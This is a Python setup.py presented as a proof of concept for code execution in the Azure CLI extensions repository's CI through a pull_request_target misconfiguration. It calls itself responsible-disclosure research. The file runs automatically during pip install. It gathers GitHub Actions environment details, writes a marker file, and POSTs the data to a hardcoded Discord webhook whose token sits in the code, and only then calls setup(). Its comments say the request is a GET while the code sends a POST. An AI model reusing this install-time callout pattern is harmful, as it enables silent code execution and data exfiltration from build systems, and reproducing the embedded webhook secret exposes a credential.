#!/usr/bin/env python

# --------------------------------------------------------------------------------------------
# SECURITY RESEARCH - Proof of Concept
# This file demonstrates arbitrary code execution during pip install
# via a pull_request_target workflow misconfiguration.
#
# This PoC is HARMLESS - it only:
# 1. Writes a marker file to prove code execution
# 2. Sends a GET request to a webhook to prove network access
# 3. Prints environment info (no secrets - there are none to steal)
#
# Reported to MSRC as part of responsible disclosure.
# --------------------------------------------------------------------------------------------

import os
import json
import datetime

# ============================================================
# PoC: This code runs during `azdev extension add securitytest`
# which is triggered by opening a fork PR.
# ============================================================

poc_marker = {
    "poc": "GitHub Actions pull_request_target RCE",
    "researcher": "Bodlux",
    "timestamp": datetime.datetime.utcnow().isoformat(),
    "proof": "This file was created by setup.py during pip install",
    "github_run_id": os.environ.get("GITHUB_RUN_ID", "unknown"),
    "github_repository": os.environ.get("GITHUB_REPOSITORY", "unknown"),
    "github_event_name": os.environ.get("GITHUB_EVENT_NAME", "unknown"),
    "github_actor": os.environ.get("GITHUB_ACTOR", "unknown"),
    "runner_os": os.environ.get("RUNNER_OS", "unknown"),
    "note": "No secrets were accessed. GITHUB_TOKEN is read-only."
}

# Write marker file to prove code execution
marker_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "poc_executed.json")
with open(marker_path, "w") as f:
    json.dump(poc_marker, f, indent=2)

print("\n" + "=" * 60)
print("  PoC: Arbitrary code execution via pull_request_target")
print("  Repository: " + poc_marker["github_repository"])
print("  Run ID: " + poc_marker["github_run_id"])
print("  Event: " + poc_marker["github_event_name"])
print("  Marker written to: " + marker_path)
print("=" * 60 + "\n")

# ============================================================
# Webhook callback to prove network access + code execution
# Replace YOUR_WEBHOOK_URL with your actual webhook before testing
# ============================================================
try:
    import urllib.request
    import urllib.parse

    WEBHOOK_URL = os.environ.get("POC_WEBHOOK_URL", "")
    if not WEBHOOK_URL:
        # Fallback: use the Discord webhook for logging
        # REPLACE THIS with your actual webhook before running
        WEBHOOK_URL = "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

    payload = json.dumps({
        "content": (
            f"**PoC: pull_request_target RCE**\n"
            f"```\n"
            f"Repo: {poc_marker['github_repository']}\n"
            f"Run: {poc_marker['github_run_id']}\n"
            f"Event: {poc_marker['github_event_name']}\n"
            f"Actor: {poc_marker['github_actor']}\n"
            f"Time: {poc_marker['timestamp']}\n"
            f"```\n"
            f"Code execution achieved via setup.py in fork PR.\n"
            f"No secrets accessed (token is read-only)."
        )
    }).encode("utf-8")

    req = urllib.request.Request(
        WEBHOOK_URL,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    urllib.request.urlopen(req, timeout=5)
    print("[PoC] Webhook callback sent successfully.")
except Exception as e:
    print(f"[PoC] Webhook callback failed (non-critical): {e}")

# ============================================================
# NOTE: Artifact poisoning is NOT performed in this PoC.
# We only prove code execution. No files are modified.
# ============================================================
print("[PoC] No artifacts modified. This is an observation-only PoC.")

# ============================================================
# Now do the normal setup.py stuff so the install doesn't crash
# ============================================================

from setuptools import setup, find_packages

setup(
    name='securitytest',
    version='0.1.0',
    description='Security research PoC - harmless',
    author='Bodlux',
    url='https://github.com/Azure/azure-cli-extensions',
    license='MIT',
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Programming Language :: Python :: 3',
    ],
    packages=find_packages(),
    install_requires=[],
    package_data={'azext_securitytest': ['azext_metadata.json']},
)
